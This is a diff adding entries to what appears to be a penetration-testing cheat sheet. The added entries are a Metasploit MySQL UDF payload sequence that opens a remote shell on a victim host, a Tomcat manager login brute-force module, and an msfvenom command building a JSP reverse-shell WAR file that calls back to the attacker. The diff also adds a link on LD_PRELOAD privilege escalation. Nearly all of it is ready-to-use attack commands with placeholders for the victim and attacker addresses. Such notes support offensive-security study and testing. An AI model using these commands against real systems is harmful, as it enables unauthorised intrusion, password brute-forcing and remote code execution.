@@ -257,6 +257,25 @@ https://dzmitry-savitski.github.io/2018/03/groovy-reverse-and-bind-shell
     > set session <session ID>
   > run
   
+> mysql remote shell via msfconsole:
+  > gather user and pass for login
+  > use exploit/multi/mysql/mysql_udf_payload
+  > set FORCE_UDF_UPLOAD true
+  > set PASSWORD <Password>
+  > set RHOSTS <victim ip>
+  > set TARGET 1
+  > set LHOST <local ip>
+  > exploit
+  > session -i 2
 
-
+> tomcat manager login brute force:
+  > use auxiliary/scanner/http/tomcat_mgr_login
+  > set stop_on_success true
+  > set RHOSTS
+  
+> msfvenom war package for RCE in Tomcat:
+  > msfvenom -p java/jsp_shell_reverse_tcp LHOST=<local ip> LPORT=443 -f war > shell.war
+  
+> env_keep+=LD_PRELOAD privilege escalation:
+  https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/
 
